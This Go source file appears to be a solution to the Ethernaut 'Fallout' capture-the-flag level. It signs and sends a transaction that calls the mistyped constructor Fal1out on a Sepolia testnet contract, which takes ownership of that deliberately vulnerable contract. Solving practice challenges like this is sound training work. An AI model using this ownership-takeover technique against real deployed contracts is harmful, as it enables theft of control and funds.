package main

import (
	"context"
	"crypto/ecdsa"
	"log"
	"math/big"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/rbrick/ethernaut/contracts"
)

type FalloutPuzzle struct{}

func (*FalloutPuzzle) Execute(rpcClient *ethclient.Client, chainId *big.Int,
	privateKey *ecdsa.PrivateKey, accountAddress common.Address) error {

	contractAddr := common.HexToAddress("0xBAbc905c8839B9f3ea80c6d53B62688190a1452C")

	falloutContract, err := contracts.NewFallout(contractAddr, rpcClient)

	if err != nil {
		return err
	}

	keyedTransactor, err := bind.NewKeyedTransactorWithChainID(privateKey, chainId)

	if err != nil {
		return err
	}

	txn, err := falloutContract.Fal1out(keyedTransactor)

	if err != nil {
		return err
	}

	log.Println("submitted tx:", txn.Hash().String())
	bind.WaitMined(context.Background(), rpcClient, txn)
	log.Println("transaction completed: https://sepolia.etherscan.io/tx/" + txn.Hash().String())

	return nil
}
